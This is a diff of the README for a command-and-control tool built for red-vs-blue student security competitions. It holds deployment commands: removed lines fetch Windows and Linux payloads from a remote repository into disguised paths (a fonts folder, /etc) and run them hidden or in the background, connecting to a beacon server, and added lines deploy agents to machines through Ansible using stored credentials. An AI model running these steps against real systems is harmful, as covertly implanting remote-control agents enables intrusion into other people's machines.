@@ -2,74 +2,51 @@ This is a tool developed by James Southcott and Danny Nichols for the RITSEC Red
 
 This tool is meant to be used in Red Vs. Blue style Cybersecurity Competitions for educational purposes.
 
-**Usage:**
+# Deployment
 
-Windows C2 Server
+**Agents**
 
-ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
+We recommend using Ansible to remotely deploy Windows and Linux agents.
 
-ps> .\setup.ps1
-
-
-Windows Long Range Beacon Server
-
-ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
-
-ps> .\setup.ps1 -server Beacon
-
-
-Windows Payload
-
-ps> wget -o C:\Windows\fonts\Javalanche.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.ps1?ref_type=heads"
-
-ps> Start-Process -FilePath "powershell.exe" -ArgumentList "set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress {IP Address of Beacon}" -WindowStyle Hidden -Verb RunAs
-
-
-Linux C2 Server
-
+```
+*Prerequisites: A Linux machine with SSH access to all linux competition mahcines, and winrm access to all windows compeitition machines*
 $ sudo apt update
+$ sudo apt install curl, ansible
+$ sudo curl -o inventory.yml https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/Ansible/inventory.yml?ref_type=heads
+$ sudo curl -o playbook.yml "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/playbook.yml?ref_type=heads"
+*Note: In some competitions, you will be provided an inventory.yml file for deployment. You will have to edit the **hosts:** line in the playbook to reflect the group of hosts to deploy to.
+If you are not given an inventory.yml file, you will need to edit the existing inventory.yml file to include the proper hosts, usernames, and passwords
+$ ansible-playbook -i inventory.yml playbook.yml 
+```
 
+**C2 Server**
+
+We Recommend Deploying the C2 Server on a linux machine, for the best experience
+
+```
+$ sudo apt update
 $ sudo apt install curl
-
 $ sudo mkdir /home/javalanche
-
 $ cd /home/javalanche
-
 $ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.sh?ref_type=heads
-
 $ sudo chmod +x serverSetup.sh
-
 $ sudo ./serverSetup.sh
+```
 
+**Proxy Server**
 
-Linux Long Range Beacon Server
+We recommend Deploying the Long Range Beacon Servers on a linux machine, for the best experience.
+*Prerequisite: The Proxy Server must have a Public IP Address. If you are not able to obtain a Public IP Address, then both the Proxy and C2 Servers must be deployed on the same WAN as the competition machines.
 
+```
 $ sudo apt update
-
 $ sudo apt install curl
-
 $ sudo mkdir /home/javalanche
-
 $ cd /home/javalanche
-
 $ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.sh?ref_type=heads
-
 $ sudo chmod +x serverSetup.sh
-
 $ sudo ./serverSetup.sh -server Beacon
-
-
-Linux Payload
-
-$ sudo apt update
-
-$ sudo apt install curl
-
-$ sudo curl -o /etc/javalanche.sh "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
-
-$ sudo chmod +x /etc/javalanche.sh
-
-$ sudo -b nohup /etc/javalanche.sh {IP Address of Beacon} >/dev/null 2>&1
+```
 
 **Network Diagram:**
 ![alt text](Images/C2NetworkDiagram.drawio.png)
@@ -134,8 +111,6 @@ UML:
 
 **TODO**
 Add Linux Attack Chains,
-
-Clean up Linux Server Setup output,
 
 Fix linux cronjobs,
 
